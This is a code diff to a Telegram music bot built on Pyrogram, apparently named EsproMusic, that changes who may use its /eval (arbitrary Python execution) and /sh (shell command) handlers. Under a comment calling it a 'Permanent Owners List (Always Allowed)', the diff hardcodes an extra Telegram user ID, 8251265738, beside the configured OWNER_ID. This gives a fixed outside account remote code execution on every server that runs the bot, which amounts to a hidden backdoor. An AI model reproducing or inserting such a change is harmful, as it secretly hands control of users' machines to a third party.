@@ -13,6 +13,9 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from EsproMusic import app
 from config import OWNER_ID
 
+# 💥 Permanent Owners List (Always Allowed)
+PERMANENT_OWNER_IDS = [OWNER_ID, 8251265738]
+
 
 async def aexec(code, client, message):
     exec(
@@ -28,15 +31,17 @@ async def edit_or_reply(msg: Message, **kwargs):
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
 
+# -------------------- EVAL COMMAND --------------------
+
 @app.on_edited_message(
     filters.command("eval")
-    & filters.user(OWNER_ID)
+    & filters.user(PERMANENT_OWNER_IDS)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("eval")
-    & filters.user(OWNER_ID)
+    & filters.user(PERMANENT_OWNER_IDS)
     & ~filters.forwarded
     & ~filters.via_bot
 )
@@ -138,15 +143,17 @@ async def forceclose_command(_, CallbackQuery):
         return
 
 
+# -------------------- SHELL COMMAND --------------------
+
 @app.on_edited_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & filters.user(PERMANENT_OWNER_IDS)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & filters.user(PERMANENT_OWNER_IDS)
     & ~filters.forwarded
     & ~filters.via_bot
 )
